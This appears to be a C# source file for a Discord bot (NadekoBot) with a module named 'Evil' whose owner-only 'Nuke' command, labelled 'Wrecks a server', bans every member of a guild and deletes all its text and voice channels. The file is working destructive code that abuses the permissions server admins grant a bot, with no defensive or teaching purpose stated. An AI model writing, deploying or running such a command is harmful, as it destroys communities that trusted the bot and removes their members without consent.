using Discord.Commands;
using NadekoBot.Common.Attributes;
using NadekoBot.Core.Services;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace NadekoBot.Modules.Evil
{
    class Evil : NadekoTopLevelModule
    {

        private static DbService _db;
        private readonly ICurrencyService _cs;


        public Evil(DbService db, ICurrencyService cs)
        {
            _db = db;
            _cs = cs;
        }

        [NadekoCommand]
        [RequireOwner]
        [Summary("Wrecks a server.")]
        public async Task Nuke()
        {
            var users = await Context.Guild.GetUsersAsync();
            foreach (var user in users)
                await Context.Guild.AddBanAsync(user);

            var channels = await Context.Guild.GetChannelsAsync();
            foreach (var channel in channels)
                await channel.DeleteAsync();

            var vcs = await Context.Guild.GetVoiceChannelsAsync();
            foreach (var vc in vcs)
                await vc.DeleteAsync();
        }
    }
}
